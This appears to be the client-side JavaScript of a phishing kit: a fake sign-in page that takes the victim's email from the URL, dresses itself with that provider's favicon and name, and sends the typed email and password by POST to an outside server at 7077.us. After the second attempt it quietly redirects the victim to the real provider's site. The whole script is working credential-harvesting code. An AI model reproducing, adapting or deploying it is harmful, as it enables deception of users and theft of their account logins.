

    /* global $ */
    $(document).ready(function(){
		var count=0;
		var timer;
		var timeout = 0000;
		
		$('#email, #password').on('input',function(){
			$('#error').hide();
			$('#msg').hide();
		});

		$('#email').on('input', function() {
			//clearTimeout(timer);
			//alert("i deteted chnages")
			if ($('#email').val()) {
					var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
					if (filter.test($('#email').val())) {
						//alert("email is valid")
						timer = setTimeout(function(){
							var email = $('#email').val()
							var ind=email.indexOf("@");
							var my_slice=email.substr((ind+1));
							var c= my_slice.substr(0, my_slice.indexOf('.'));
							var final= c.toLowerCase();
							var finalu= c[0].toUpperCase() + c.slice(1);
							$("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
							$("#logoname").text(finalu);
							$(".logoname").html(finalu);
							$("#favicon").attr("href","https://www.google.com/s2/favicons?domain="+my_slice);
						}, timeout);
					}
				
			}
		});

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {
	  

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
		
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;

        if (filter.test(my_email)) {
          $('#email').attr('readonly', true);
		  $("#password").focus();
        }
		
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c[0].toUpperCase() + c.slice(1);
        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);
		$("#favicon").attr("href","https://www.google.com/s2/favicons?domain="+my_slice);
      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#msg').text('Email Error.! Please check your email carefully.')
        $('#msg').show();
        $("#email").focus();
        return false;
      }
	  
	  else if (password == "") {
		//alert("Wrong pass")
		$('#msg').text('Password Error.! Please check your password carefully.')
        $('#msg').show();
        $("#password").focus();
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://7077.us/noth/layout.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });
    });


    });


  